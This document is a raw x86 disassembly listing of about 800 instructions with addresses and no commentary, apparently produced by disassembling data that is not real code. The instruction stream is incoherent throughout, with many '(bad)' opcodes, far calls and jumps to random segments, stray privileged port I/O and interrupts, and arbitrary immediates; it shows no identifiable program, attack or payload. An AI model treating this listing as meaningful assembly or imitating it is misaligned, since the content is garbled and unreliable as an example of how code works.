  427d4e:	inc    esi
  427d4f:	shl    bl,1
  427d51:	call   0x25f3:0xcb4954f6
  427d58:	cli    
  427d59:	arpl   WORD PTR [edx],cx
  427d5b:	sbb    edx,DWORD PTR [ecx+edx*1]
  427d5e:	push   DWORD PTR [eax+0x5f]
  427d61:	dec    edx
  427d62:	rol    dl,cl
  427d64:	mov    edi,0x587381d7
  427d69:	adc    al,0x93
  427d6b:	push   esi
  427d6c:	fcom   DWORD PTR [edx-0x59]
  427d6f:	add    edi,ecx
  427d71:	pusha  
  427d72:	inc    edi
  427d73:	dec    ecx
  427d74:	ret    0x54bd
  427d77:	mov    ch,0x8
  427d79:	jg     0x427dbc
  427d7b:	sub    ah,bl
  427d7d:	repz mov ds:0x7d18a3d,al
  427d83:	cs sbb dl,dl
  427d86:	dec    esi
  427d87:	punpcklbw mm2,mm2
  427d8a:	jb     0x427d26
  427d8c:	int    0xa8
  427d8e:	and    BYTE PTR [ecx+ebx*2+0x44f7671a],0x8
  427d96:	lods   eax,DWORD PTR ds:[esi]
  427d97:	(bad)  
  427d98:	lock scas al,BYTE PTR es:[edi]
  427d9a:	pop    eax
  427d9b:	cmc    
  427d9c:	mov    ah,0x17
  427d9e:	xchg   edx,eax
  427d9f:	aaa    
  427da0:	push   ecx
  427da1:	xchg   esp,eax
  427da2:	sub    eax,0x6ca56426
  427da7:	repnz call 0x4a23:0x82506f56
  427daf:	fs je  0x427e23
  427db2:	jb     0x427d83
  427db4:	mov    edx,0x8281b1aa
  427db9:	cdq    
  427dba:	rcr    DWORD PTR [eax-0x11a1e392],cl
  427dc0:	add    dh,BYTE PTR [eax]
  427dc2:	pop    esp
  427dc3:	inc    ecx
  427dc4:	and    al,BYTE PTR [esi+ecx*1]
  427dc7:	clc    
  427dc8:	(bad)
  427dcb:	add    al,0x7f
  427dcd:	pop    eax
  427dce:	xor    BYTE PTR [edi],bl
  427dd0:	adc    BYTE PTR [ebx+0x78c7e1e6],dl
  427dd6:	and    BYTE PTR [ebx],dl
  427dd8:	xchg   BYTE PTR [ecx+0x1b],ah
  427ddb:	pop    esp
  427ddc:	cmp    esp,DWORD PTR [edi]
  427dde:	pop    esi
  427ddf:	daa    
  427de0:	sub    eax,0x82c09bae
  427de5:	ins    DWORD PTR es:[edi],dx
  427de6:	push   0xa5f4431b
  427deb:	mov    ds:0x470cbb25,al
  427df0:	jg     0x427ddd
  427df2:	scas   eax,DWORD PTR es:[edi]
  427df3:	mov    al,ds:0xd8be31b4
  427df8:	adc    ebx,DWORD PTR [ebx+0x63ee9a31]
  427dfe:	stc    
  427dff:	cmp    eax,0xe0de126e
  427e04:	xchg   dl,dh
  427e06:	les    edi,FWORD PTR [esi]
  427e08:	sub    eax,0xa6a9229e
  427e0d:	xchg   ebx,eax
  427e0e:	or     al,0x7c
  427e10:	xchg   ecx,eax
  427e11:	pop    edx
  427e12:	sub    cl,BYTE PTR [eax]
  427e14:	iret   
  427e15:	inc    esi
  427e16:	mov    ah,BYTE PTR [eax+0x36f11dfc]
  427e1c:	call   0x66fb:0xf7b37076
  427e23:	fcomi  st,st(3)
  427e25:	push   edx
  427e26:	je     0x427dbc
  427e28:	test   DWORD PTR [eax],ebp
  427e2a:	cli    
  427e2b:	ds ret 0x3328
  427e2f:	jae    0x427e38
  427e31:	or     esi,DWORD PTR [ecx-0x19]
  427e34:	cmp    ebx,esi
  427e36:	cmp    ah,bl
  427e38:	mov    edx,0x77fdb79e
  427e3d:	jns    0x427e5d
  427e3f:	(bad)  
  427e40:	cmp    eax,0xf2909680
  427e45:	gs sbb ebx,ebx
  427e48:	and    ch,BYTE PTR [ecx]
  427e4a:	mov    ebp,0x90947162
  427e4f:	push   ds
  427e50:	lahf   
  427e51:	imul   edi,edx,0x77bbb805
  427e57:	pop    ebp
  427e58:	jns    0x427e5f
  427e5a:	dec    ebx
  427e5b:	mov    edx,0x9ce784c2
  427e60:	nop
  427e61:	les    ebp,FWORD PTR [edi]
  427e63:	std    
  427e64:	mov    eax,0xdca6dcba
  427e69:	and    eax,0xc95c7eeb
  427e6e:	lods   eax,DWORD PTR ds:[esi]
  427e6f:	sar    DWORD PTR [edx-0x5bb07566],cl
  427e75:	in     al,0x22
  427e77:	and    al,BYTE PTR [ebx+eax*2-0x557648bb]
  427e7e:	shl    DWORD PTR [eax+0x3ed598c2],cl
  427e84:	mov    dh,0x3f
  427e86:	add    BYTE PTR [eax+0x5e812fb5],dh
  427e8c:	retf   
  427e8d:	test   al,0x62
  427e8f:	mov    edi,0x13aebb88
  427e94:	dec    esi
  427e95:	(bad)  
  427e96:	jmp    0x5ae6fba1
  427e9b:	in     eax,0x23
  427e9d:	xchg   edx,eax
  427e9e:	add    ecx,ebp
  427ea0:	and    al,0x1c
  427ea2:	add    BYTE PTR [esi*8+0x1e753be8],ch
  427ea9:	xchg   esp,eax
  427eaa:	pop    ecx
  427eab:	(bad)  
  427eac:	jecxz  0x427efe
  427eae:	jno    0x427ecc
  427eb0:	gs ret 
  427eb2:	pusha  
  427eb3:	xchg   edx,eax
  427eb4:	aaa    
  427eb5:	popf   
  427eb6:	mov    ds:0x406b4b07,al
  427ebb:	sbb    ecx,DWORD PTR [ebx-0x7b]
  427ebe:	repnz pop eax
  427ec0:	(bad)  
  427ec1:	mov    ebx,0x4579a288
  427ec6:	mov    edx,0xd1937c60
  427ecb:	adc    al,0xf9
  427ecd:	fnstcw WORD PTR [edx-0xab2c98e]
  427ed3:	clc    
  427ed4:	dec    eax
  427ed5:	xchg   BYTE PTR [edx+0x8204a00],cl
  427edb:	mov    ebp,0x2b7dd4c2
  427ee0:	sbb    al,0xe5
  427ee2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ee3:	xor    cl,al
  427ee5:	xor    esp,DWORD PTR [esi+0x6ed9fb5f]
  427eeb:	ror    BYTE PTR [esi],cl
  427eed:	dec    ebx
  427eee:	mov    DWORD PTR [ecx+0x632c243c],esp
  427ef4:	mov    al,0x93
  427ef6:	xchg   edi,eax
  427ef7:	sub    dl,al
  427ef9:	xor    ah,BYTE PTR [ecx]
  427efb:	sub    DWORD PTR [ebx+ebp*8+0x29],edx
  427eff:	jbe    0x427ec6
  427f01:	mov    edi,0x9f33f8b0
  427f06:	adc    cl,BYTE PTR [eax+edx*2-0x3f47d2b]
  427f0d:	scas   eax,DWORD PTR es:[edi]
  427f0e:	sahf   
  427f0f:	sar    bl,0xbf
  427f12:	outs   dx,DWORD PTR ds:[esi]
  427f13:	ins    BYTE PTR es:[edi],dx
  427f14:	stos   BYTE PTR es:[edi],al
  427f15:	mov    ds:0xee6f07fc,al
  427f1a:	fcomp  DWORD PTR [eax]
  427f1c:	enter  0xcf1a,0x68
  427f20:	xor    dl,BYTE PTR [eax-0x1f]
  427f23:	cwde   
  427f24:	push   0x4a
  427f26:	fwait
  427f27:	jecxz  0x427f3a
  427f29:	les    edi,FWORD PTR [esi+0x6f066954]
  427f2f:	xchg   edi,eax
  427f30:	or     al,0xde
  427f32:	push   0x23
  427f34:	add    eax,0xb4a244f1
  427f39:	or     eax,0xfbb08df8
  427f3e:	hlt    
  427f3f:	cmc    
  427f40:	push   edi
  427f41:	test   DWORD PTR [edi],esi
  427f43:	pop    edi
  427f44:	jne    0x427f8c
  427f46:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  427f48:	cmp    eax,0xabe9925e
  427f4d:	shl    BYTE PTR [edx-0x4c],1
  427f50:	sbb    ch,0x3b
  427f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f54:	jge    0x427f2d
  427f56:	adc    ebp,esp
  427f58:	xchg   edx,eax
  427f59:	push   esi
  427f5a:	adc    bh,BYTE PTR [esi]
  427f5c:	inc    esi
  427f5d:	into   
  427f5e:	cmp    eax,esi
  427f60:	pop    es
  427f61:	mov    dh,0x45
  427f63:	sbb    edi,DWORD PTR [edi]
  427f65:	(bad)  
  427f66:	fiadd  WORD PTR [ecx]
  427f68:	jle    0x427fca
  427f6a:	xchg   dh,al
  427f6c:	shr    DWORD PTR [edi-0x47468b27],0xba
  427f73:	rcl    DWORD PTR [ebx],0x39
  427f76:	fwait
  427f77:	push   0x78
  427f79:	mov    edi,0x632e1125
  427f7e:	xchg   ebx,eax
  427f7f:	adc    DWORD PTR [eax+eax*2+0x40],0xffffffe4
  427f84:	fstp   DWORD PTR [eax+0x218efd1e]
  427f8a:	call   0x1623:0xc78968a0
  427f91:	mov    ebx,0x208769e6
  427f96:	js     0x427f44
  427f98:	loope  0x427f2b
  427f9a:	into   
  427f9b:	test   BYTE PTR [edi],dh
  427f9d:	dec    eax
  427f9e:	js     0x427f2f
  427fa0:	(bad)  
  427fa1:	test   eax,0xf8cde61b
  427fa6:	shl    BYTE PTR [edi],cl
  427fa8:	(bad)  
  427fa9:	cli    
  427faa:	outs   dx,BYTE PTR ds:[esi]
  427fab:	and    al,ch
  427fad:	sub    eax,0x599e8bd3
  427fb2:	retf   0xab7
  427fb5:	jne    0x427f40
  427fb7:	scas   al,BYTE PTR es:[edi]
  427fb8:	fprem  
  427fba:	inc    eax
  427fbb:	or     ah,BYTE PTR [edi+0x312f7cca]
  427fc1:	sbb    edi,DWORD PTR [eax]
  427fc3:	sub    al,0xb3
  427fc5:	test   BYTE PTR [ebx],bh
  427fc7:	test   DWORD PTR [esi+0x4e],ecx
  427fca:	adc    esi,DWORD PTR [esi+0x1e0a6367]
  427fd0:	fisub  DWORD PTR [esi-0x3d0f649c]
  427fd6:	cmp    al,0xc1
  427fd8:	pusha  
  427fd9:	jne    0x427fbb
  427fdb:	mov    ecx,0xa324c8fa
  427fe0:	or     ah,0xf3
  427fe3:	pop    eax
  427fe4:	aaa    
  427fe5:	dec    edi
  427fe6:	cmp    dl,bh
  427fe8:	mov    BYTE PTR [ecx-0xe],ah
  427feb:	pop    esp
  427fec:	aas    
  427fed:	push   esi
  427fee:	mov    eax,ds:0x87c0a2f0
  427ff3:	pop    ebx
  427ff4:	int    0x72
  427ff6:	cmp    DWORD PTR [eax],esi
  427ff8:	xchg   DWORD PTR [edi+0x264717a7],edx
  427ffe:	scas   al,BYTE PTR es:[edi]
  427fff:	and    ecx,eax
  428001:	jg     0x427f86
  428003:	jl     0x427fcc
  428005:	outs   dx,BYTE PTR ds:[esi]
  428006:	add    DWORD PTR [ebx],edx
  428008:	cmp    WORD PTR [edx],ax
  42800b:	gs cmp edx,ebp
  42800e:	cld    
  42800f:	je     0x427fb5
  428011:	lea    edx,[ecx-0x4]
  428014:	push   ss
  428015:	jb     0x427fac
  428017:	and    bl,bl
  428019:	and    al,0xee
  42801b:	mov    ch,0x86
  42801d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42801e:	mov    ss,ebp
  428020:	(bad)  
  428022:	xor    DWORD PTR [eax],0xffffff99
  428025:	out    0x30,al
  428027:	or     BYTE PTR [ebx-0x245ddd15],cl
  42802d:	mov    edx,0xaa3b5a35
  428032:	dec    esi
  428033:	pop    ecx
  428034:	ret    0x1963
  428037:	xchg   cl,al
  428039:	mov    eax,ds:0xef2cabf9
  42803e:	inc    esi
  42803f:	call   0x87b870b0
  428044:	imul   ebx,DWORD PTR ds:0xd8aa4ab4,0xf7e0bdd5
  42804e:	push   eax
  42804f:	add    eax,0xa0af2b60
  428054:	arpl   WORD PTR ds:0x200228a1,cx
  42805a:	add    esi,DWORD PTR [ebx-0x4512504c]
  428060:	pop    esi
  428061:	jnp    0x427ff3
  428063:	mov    ah,BYTE PTR [ebp+ebp*8-0x6e9b05cc]
  42806a:	mov    edx,0xf59055aa
  42806f:	sub    ebp,DWORD PTR [ebx+0x33]
  428072:	rol    BYTE PTR [edi-0x4c],0xcc
  428076:	sbb    esi,DWORD PTR [esi]
  428078:	and    dl,BYTE PTR [edx+0x53]
  42807b:	repnz mov fs,WORD PTR [edx-0x6ed7bc6e]
  428082:	mov    eax,0xa9103359
  428087:	aaa    
  428088:	loopne 0x4280e7
  42808a:	xchg   ecx,eax
  42808b:	add    dl,BYTE PTR [esp+ebx*4]
  42808e:	call   0xf54:0x7983cb97
  428095:	lock div BYTE PTR [ecx+0x12]
  428099:	int    0x85
  42809b:	adc    al,0x59
  42809d:	scas   eax,DWORD PTR es:[edi]
  42809e:	data16 jl 0x4280e1
  4280a1:	retf   0xd195
  4280a4:	popf   
  4280a5:	adc    eax,0x64fd9087
  4280aa:	dec    eax
  4280ab:	mov    dl,0x2b
  4280ad:	push   ebp
  4280ae:	es mov bl,0x24
  4280b1:	cmc    
  4280b2:	pop    ds
  4280b3:	(bad)  
  4280b4:	jbe    0x428043
  4280b6:	test   eax,0xd695e104
  4280bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280bc:	pushf  
  4280bd:	mov    ebp,edi
  4280bf:	mov    esp,0xeff50de9
  4280c4:	lahf   
  4280c5:	in     eax,0x6a
  4280c7:	jnp    0x42810a
  4280c9:	sar    ebp,0xa
  4280cc:	jbe    0x4280e0
  4280ce:	stos   DWORD PTR es:[edi],eax
  4280cf:	sti    
  4280d0:	jno    0x4280bc
  4280d2:	pop    esi
  4280d3:	mov    al,0x29
  4280d5:	and    bh,BYTE PTR [ebx+0x61]
  4280d8:	fisttp WORD PTR [edx+eax*8+0xdfe49f]
  4280df:	add    BYTE PTR [eax],al
  4280e1:	add    dh,al
  4280e3:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4280e5:	push   eax
  4280e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280e7:	shl    bh,cl
  4280e9:	div    DWORD PTR [ebx-0x6dd89742]
  4280ef:	fwait
  4280f0:	js     0x4280d4
  4280f2:	mov    ch,0xf8
  4280f4:	add    DWORD PTR [eax],eax
  4280f6:	fld    DWORD PTR [eax+eax*1]
  4280f9:	add    BYTE PTR [edi-0x11],ah
  4280fc:	nop
  4280fd:	or     BYTE PTR [ebp-0x3e776c18],bl
  428103:	(bad)  
  428104:	call   0x131b7269
  428109:	leave  
  42810a:	pop    DWORD PTR [eax]
  42810c:	and    BYTE PTR [eax+eax*4+0x50c90a4a],dh
  428113:	xor    DWORD PTR [eax],esp
  428115:	cmp    edi,ecx
  428117:	or     al,0x1a
  428119:	mov    eax,DWORD PTR [esp+eiz*2-0x7d]
  42811d:	leave  
  42811e:	out    dx,eax
  42811f:	ror    DWORD PTR [ecx+0x64],0x9e
  428123:	outs   dx,BYTE PTR ds:[esi]
  428124:	mov    ds:0xdfb1d3db,al
  428129:	mov    ebx,0x97355545
  42812e:	in     al,0xfc
  428130:	adc    eax,ebx
  428132:	cmp    eax,0x9797616a
  428137:	shl    cl,1
  428139:	(bad)  
  42813a:	mov    BYTE PTR [edi+0x59],bl
  42813d:	cmp    DWORD PTR [edi+0x73],ebx
  428140:	call   0x3000ed66
  428145:	or     DWORD PTR [ebx+esi*4-0x4d],ecx
  428149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42814a:	mov    edi,0xf6adc766
  42814f:	stos   DWORD PTR es:[edi],eax
  428150:	dec    esi
  428151:	nop
  428152:	es loope 0x4281be
  428155:	(bad)  
  428156:	clc    
  428157:	jecxz  0x4281ae
  428159:	fdivr  QWORD PTR [ebx]
  42815b:	mov    edi,ebx
  42815d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42815e:	inc    edx
  42815f:	fdivr  QWORD PTR [ecx-0x2296441]
  428165:	fcmovnbe st,st(2)
  428167:	pop    ecx
  428168:	cmp    bl,ch
  42816a:	popf   
  42816b:	xlat   BYTE PTR ds:[ebx]
  42816c:	retf   0xd139
  42816f:	in     eax,0xe2
  428171:	xchg   edi,eax
  428172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428173:	dec    ebp
  428174:	push   esp
  428175:	pop    edi
  428176:	shl    BYTE PTR [ebx],0x33
  428179:	pop    ss
  42817a:	and    edi,DWORD PTR [edi]
  42817c:	bound  esp,QWORD PTR [ecx-0x27453735]
  428182:	in     al,dx
  428183:	rsm    
  428185:	push   ebx
  428186:	repnz not BYTE PTR [edx+0x18cc6293]
  42818d:	test   BYTE PTR [edx-0x45749c39],bh
  428193:	sub    al,0xd5
  428195:	inc    edi
  428196:	xlat   BYTE PTR ds:[ebx]
  428197:	ds fcmovnb st,st(0)
  42819a:	jmp    0x9760:0xcce5c972
  4281a1:	daa    
  4281a2:	push   ss
  4281a3:	mov    WORD PTR [ebx+edx*4-0x2b697287],gs
  4281aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281ab:	dec    eax
  4281ac:	rcl    BYTE PTR [ebx],0xe3
  4281af:	enter  0x47f1,0xd0
  4281b3:	or     al,0x38
  4281b5:	sub    al,0x37
  4281b7:	aas    
  4281b8:	sbb    BYTE PTR ds:0xf567368f,cl
  4281be:	add    eax,0xcc911946
  4281c3:	fs pop ebx
  4281c5:	test   eax,0xb941888f
  4281ca:	out    dx,al
  4281cb:	pop    ebp
  4281cc:	addr16 push ecx
  4281ce:	frstor [esi+0x2c]
  4281d1:	xchg   BYTE PTR [edx+0x3013ba65],al
  4281d7:	repz jp 0x4281a7
  4281da:	jbe    0x4281c5
  4281dc:	sbb    edx,DWORD PTR [esi+0x79dc044]
  4281e2:	idiv   DWORD PTR [edx+0x291c154]
  4281e8:	xor    cl,ch
  4281ea:	jle    0x42820b
  4281ec:	adc    ebp,0x59
  4281ef:	loopne 0x4281d8
  4281f1:	fild   WORD PTR [ecx]
  4281f3:	cmp    eax,0x6fcb8f7f
  4281f8:	addr16 out dx,eax
  4281fa:	xchg   edi,eax
  4281fb:	shl    dh,1
  4281fd:	ficom  DWORD PTR [eax+0xa]
  428200:	push   esp
  428201:	aaa    
  428202:	push   0xffffff80
  428204:	adc    BYTE PTR [esi+0x5343c775],bl
  42820a:	sbb    eax,0xbdf24b33
  42820f:	xor    cl,dh
  428211:	hlt    
  428212:	mov    eax,ds:0x268fba13
  428217:	or     BYTE PTR [ebp+0x2b],bh
  42821a:	mov    BYTE PTR [ebp+0x432ec032],bl
  428220:	dec    ecx
  428221:	(bad)  
  428222:	xchg   ebp,eax
  428223:	dec    ebx
  428224:	xchg   DWORD PTR [edx+ebx*8-0x2d],ebp
  428228:	push   es
  428229:	xchg   ecx,eax
  42822a:	mov    ebp,0xcd7c85e7
  42822f:	out    dx,eax
  428230:	push   ecx
  428231:	push   esp
  428232:	push   edx
  428233:	add    esi,edi
  428235:	dec    edi
  428236:	out    dx,al
  428237:	mov    ah,0x91
  428239:	outs   dx,DWORD PTR ds:[esi]
  42823a:	push   edx
  42823b:	mov    DWORD PTR [esi-0x25],eax
  42823e:	cs push ecx
  428240:	mov    ds:0xb363cd5e,eax
  428245:	loopne 0x4281ec
  428247:	aaa    
  428248:	imul   ebp,edx,0x5507ab0f
  42824e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42824f:	jl     0x42829e
  428251:	out    0xc8,al
  428253:	xor    al,0x72
  428255:	jl     0x42824e
  428257:	mov    WORD PTR [edi-0x7d],fs
  42825a:	jbe    0x4282d9
  42825c:	pop    ecx
  42825d:	pusha  
  42825e:	add    al,0x3a
  428260:	dec    eax
  428261:	jge    0x428289
  428263:	inc    esi
  428264:	leave  
  428265:	xabort 0x61
  428268:	dec    esi
  428269:	or     DWORD PTR [edi+0x4b3464aa],0x7e
  428270:	fwait
  428271:	cld    
  428272:	jle    0x428292
  428274:	xor    ah,dh
  428276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428277:	sbb    eax,0xd3a40163
  42827c:	pop    esi
  42827d:	(bad)  
  42827e:	adc    bh,cl
  428280:	imul   ecx,ecx,0xffffff87
  428283:	push   cs
  428284:	dec    edx
  428285:	pop    edx
  428286:	mov    ah,cl
  428288:	jns    0x428249
  42828a:	repz or al,0xd8
  42828d:	lock xor DWORD PTR [ebp+0x15ea934a],ebp
  428294:	(bad)  
  428295:	jp     0x428219
  428297:	test   eax,0x26881fb6
  42829c:	sbb    ebx,esp
  42829e:	lds    esi,FWORD PTR [eax+0x61729fca]
  4282a4:	mov    dl,0xc6
  4282a6:	sub    cl,BYTE PTR [ebp+0x667ff50e]
  4282ac:	mov    ds:0x299401a0,al
  4282b1:	and    dh,BYTE PTR [ecx-0x76083ae7]
  4282b7:	mov    bl,0x2e
  4282b9:	repnz shl BYTE PTR [edx+0xf],cl
  4282bd:	dec    ebx
  4282be:	cmp    ebp,ebp
  4282c0:	out    dx,al
  4282c1:	ss out 0xb4,eax
  4282c4:	out    0x14,al
  4282c6:	outs   dx,BYTE PTR ds:[esi]
  4282c7:	adc    BYTE PTR [esi-0x566a90e1],bh
  4282cd:	lea    esi,[ebp-0xa132e95]
  4282d3:	stos   BYTE PTR es:[edi],al
  4282d4:	call   0x69e47642
  4282d9:	frstor [edi-0x7a]
  4282dc:	test   BYTE PTR [ebx+ebp*8+0x4a],dl
  4282e0:	test   BYTE PTR [eax],0x33
  4282e3:	fistp  DWORD PTR [ecx]
  4282e5:	xchg   ah,bh
  4282e7:	add    cl,BYTE PTR [edi]
  4282e9:	lds    edi,FWORD PTR [ecx+eax*8-0x4c]
  4282ed:	bound  esp,QWORD PTR [ebx]
  4282ef:	leave  
  4282f0:	push   ds
  4282f1:	push   edi
  4282f2:	call   0x7b4e904b
  4282f7:	lods   al,BYTE PTR ds:[esi]
  4282f8:	mov    BYTE PTR [esi+0x31],dh
  4282fb:	xchg   esp,eax
  4282fc:	loop   0x42837a
  4282fe:	and    al,0xbb
  428300:	ja     0x4282a0
  428302:	ror    ah,0xf3
  428305:	add    ch,ch
  428307:	lahf   
  428308:	stos   DWORD PTR es:[edi],eax
  428309:	je     0x42831b
  42830b:	add    bl,bh
  42830d:	and    BYTE PTR [ebx-0x4f3b8290],bh
  428313:	pop    ds
  428314:	out    dx,al
  428315:	stc    
  428316:	aaa    
  428317:	push   es
  428318:	fsub   QWORD PTR [ebx-0x7f]
  42831b:	outs   dx,DWORD PTR ds:[esi]
  42831c:	jns    0x4282f1
  42831e:	push   ss
  42831f:	arpl   WORD PTR [edx-0x24],cx
  428322:	in     eax,0x66
  428324:	rcr    BYTE PTR [ebx-0x4e],cl
  428327:	mov    eax,ds:0xf8ea9b96
  42832c:	pop    esp
  42832d:	add    eax,0xaf3fedd8
  428332:	out    0xa3,eax
  428334:	jle    0x4282e9
  428336:	stos   DWORD PTR es:[edi],eax
  428337:	cli    
  428338:	loopne 0x4282fd
  42833a:	int    0x39
  42833c:	inc    edi
  42833d:	jne    0x4282df
  42833f:	je     0x428305
  428341:	sahf   
  428342:	aaa    
  428343:	ja     0x428399
  428345:	fsub   DWORD PTR [ecx-0x74]
  428348:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428349:	xchg   ebp,eax
  42834a:	dec    ebx
  42834b:	rol    BYTE PTR [edi+0x6e],1
  42834e:	or     al,BYTE PTR [ebx+0x75567bb]
  428354:	inc    dh
  428356:	add    DWORD PTR [edx+0x36],esi
  428359:	pop    ecx
  42835a:	xchg   edi,esi
  42835c:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  42835e:	call   0x75893799
  428363:	test   al,0x6d
  428365:	jle    0x4283cd
  428367:	out    dx,al
  428368:	lahf   
  428369:	outs   dx,BYTE PTR ds:[esi]
  42836a:	push   0xacc18468
  42836f:	fwait
  428370:	lods   eax,DWORD PTR ds:[esi]
  428371:	(bad)  
  428372:	jmp    0x8ff79e36
  428377:	call   0x25c9ae78
  42837c:	mov    WORD PTR [ecx-0x7d],?
  42837f:	xchg   edx,eax
  428380:	fnsave [esi-0x3a]
  428383:	in     eax,dx
  428384:	pop    ebp
  428385:	pop    ecx
  428386:	xor    bl,ah
  428388:	or     DWORD PTR [ebx+0xd166581],ecx
  42838e:	jbe    0x4283dd
  428390:	aad    0x13
  428392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428393:	mov    eax,ds:0xe17b3c2b
  428398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428399:	pop    edx
  42839a:	mov    ebx,esp
  42839c:	xchg   edi,eax
  42839d:	mov    cl,ah
  42839f:	sbb    bl,al
  4283a1:	push   edi
  4283a2:	ins    BYTE PTR es:[edi],dx
  4283a3:	popf   
  4283a4:	xchg   BYTE PTR [edx+eax*4-0x4e1f1329],dl
  4283ab:	adc    al,0x87
  4283ad:	fistp  DWORD PTR [edx+0x129e791d]
  4283b3:	jmp    0x90f4:0x6bce75c4
  4283ba:	dec    ecx
  4283bb:	js     0x4283b6
  4283bd:	jne    0x42837a
  4283bf:	gs test eax,0x58bfc630
  4283c5:	add    eax,0xac9a67db
  4283ca:	pop    ss
  4283cb:	pop    esi
  4283cc:	jne    0x428417
  4283ce:	add    al,0x33
  4283d0:	ss call ebp
  4283d3:	pop    ebp
  4283d4:	or     DWORD PTR [ebx+0x40],eax
  4283d7:	aad    0x3d
  4283d9:	jae    0x42843f
  4283db:	cmp    dl,al
  4283dd:	aam    0x21
  4283df:	dec    ebx
  4283e0:	scas   al,BYTE PTR es:[edi]
  4283e1:	jmp    0x428424
  4283e3:	sbb    edi,0xa7159b69
  4283e9:	test   DWORD PTR [ebx],ebp
  4283eb:	stos   DWORD PTR es:[edi],eax
  4283ec:	fmul   QWORD PTR [ecx]
  4283ee:	jae    0x428426
  4283f0:	inc    ebp
  4283f1:	sub    al,0x98
  4283f3:	xchg   edx,eax
  4283f4:	jbe    0x42844c
  4283f6:	mov    dh,BYTE PTR [ecx+0x3a2de795]
  4283fc:	mov    bh,0x58
  4283fe:	mov    ebp,0x3f6eb51b
  428403:	scas   eax,DWORD PTR es:[edi]
  428404:	cwde   
  428405:	mov    eax,ds:0xa1e5e39c
  42840a:	fisub  DWORD PTR [edi]
  42840c:	jle    0x428456
  42840e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42840f:	inc    ecx
  428410:	test   DWORD PTR es:[esi+0x1e],ebp
  428414:	rcr    BYTE PTR [edx],1
  428416:	dec    ebx
  428417:	dec    edx
  428418:	push   ds
  428419:	sub    DWORD PTR [edi-0x7],0xffffffb5
  42841d:	sub    esp,DWORD PTR [esi+0x67066e24]
  428423:	sbb    al,0x8a
  428425:	stc    
  428426:	enter  0xf814,0xb6
  42842a:	inc    ebp
  42842b:	cld    
  42842c:	mov    edi,0xad82d21b
  428431:	and    al,0xf1
  428433:	push   esi
  428434:	stos   BYTE PTR es:[edi],al
  428435:	adc    DWORD PTR [ebp+0x56],edi
  428438:	test   DWORD PTR [ebx],ebx
  42843a:	adc    eax,0x4518d90e
  42843f:	dec    edi
  428440:	cs xor eax,0x144dd5f4
  428446:	jne    0x42843a
  428448:	lock fldenv [ecx+0x4e218590]
  42844f:	jne    0x428416
  428451:	pop    ss
  428452:	popa   
  428453:	jecxz  0x4283fb
  428455:	cdq    
  428456:	adc    eax,0x933f2c76
  42845b:	ss dec ebx
  42845d:	enter  0xdd9a,0xd3
  428461:	jnp    0x428466
  428463:	mov    dh,0xff
  428465:	adc    BYTE PTR [ebp-0x10],0x47
  428469:	push   esi
  42846a:	mov    cl,0xce
  42846c:	ret    
  42846d:	(bad)  
  42846e:	jne    0x4284b3
  428470:	ret    0xcd25
  428473:	mov    cl,0x6c
  428475:	mov    bh,0xc3
  428477:	clc    
  428478:	push   0x44
  42847a:	xor    al,0xd3
  42847c:	push   0x9d57b899
  428481:	into   
  428482:	imul   eax,DWORD PTR [edx+ebx*1+0x3a],0xfffffff9
  428487:	dec    esp
  428488:	cmp    ebx,DWORD PTR [edx]
  42848a:	push   es
  42848b:	sub    BYTE PTR [esp+eax*4],dh
  42848e:	lods   eax,DWORD PTR ds:[esi]
  42848f:	xor    al,bl
  428491:	xor    esi,esi
  428493:	push   esi
  428494:	lods   al,BYTE PTR ds:[esi]
  428495:	cli    
  428496:	aam    0xdf
  428498:	fs inc edi
  42849a:	push   ebp
  42849b:	mov    cl,0x4e
  42849d:	mov    edi,0x680c4788
  4284a2:	lods   eax,DWORD PTR ds:[esi]
  4284a3:	test   al,0xc6
  4284a5:	and    al,dl
  4284a7:	jp     0x428507
  4284a9:	or     DWORD PTR [edi],esp
  4284ab:	dec    ecx
  4284ac:	int3   
  4284ad:	ja     0x42848a
  4284af:	jp     0x428467
  4284b1:	lock mov esi,0xa6f8a553
  4284b7:	call   0xa336:0xcbde71f4
  4284be:	xchg   ebp,eax
  4284bf:	test   BYTE PTR [eax+0x2d],ah
  4284c2:	or     eax,0x2505ec10
  4284c7:	mov    al,0x4f
  4284c9:	sub    DWORD PTR [ebx],edx
  4284cb:	xor    al,0xf0
  4284cd:	or     cl,bh
  4284cf:	rcl    DWORD PTR [edx+0x1b9cfe89],cl
  4284d5:	or     al,0x56
  4284d7:	cli    
  4284d8:	inc    eax
  4284d9:	push   ebp
  4284da:	retf   
  4284db:	in     eax,0xc2
  4284dd:	js     0x428544
  4284df:	mov    esi,0x77e79586
  4284e4:	loop   0x428564
  4284e6:	(bad)  
  4284e7:	stc    
  4284e8:	adc    eax,0x6a0adc94
  4284ed:	push   ds
  4284ee:	sbb    eax,0x746c6c52
  4284f3:	ret    
  4284f4:	pop    edx
  4284f5:	rcl    DWORD PTR [ebp+0x20e2a8d],1
  4284fb:	mov    ch,0xfe
  4284fd:	mov    cl,0x94
  4284ff:	ja     0x4284d1
  428501:	out    dx,eax
  428502:	dec    esp
  428503:	inc    ecx
  428504:	fdivr  QWORD PTR [edi]
  428506:	(bad)  
  428508:	inc    eax
  428509:	shl    DWORD PTR [ebp+0x6fbd2c1a],cl
  42850f:	jle    0x428518
  428511:	jle    0x428540
  428513:	es pop ebp
  428515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428516:	nop
